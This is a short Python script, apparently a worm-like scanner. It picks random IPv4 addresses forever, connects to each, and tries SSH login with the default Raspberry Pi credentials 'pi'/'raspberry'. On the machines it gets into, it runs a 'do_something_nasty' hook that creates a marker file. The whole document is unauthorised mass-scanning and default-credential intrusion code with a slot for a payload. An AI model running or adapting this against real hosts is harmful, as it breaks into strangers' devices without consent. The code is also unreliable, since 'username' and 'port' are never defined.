from pexpect import pxssh
import socket, threading, struct, random

def connect_ssh(ip):

    print("connecting to %s" % ip)
    
    try:
        s = pxssh.pxssh()
        s.login(ip, 'pi', 'raspberry')
        s.sendline('whoami')
        s.prompt()

        if username in s.before.decode("utf-8"):
            do_something_nasty(s)
            s.logout()

    except pxssh.ExceptionPxssh as e:
        print("failed on login.")
        print(e)


def do_something_nasty(s):
    s.sendline('touch .somethingnasty')


while(1):
    ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))       

    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPsock.settimeout(1)

    try:
        TCPsock.connect((ip, port))
    except:
        continue

    # attempt to access random ip
    connect_ssh(ip)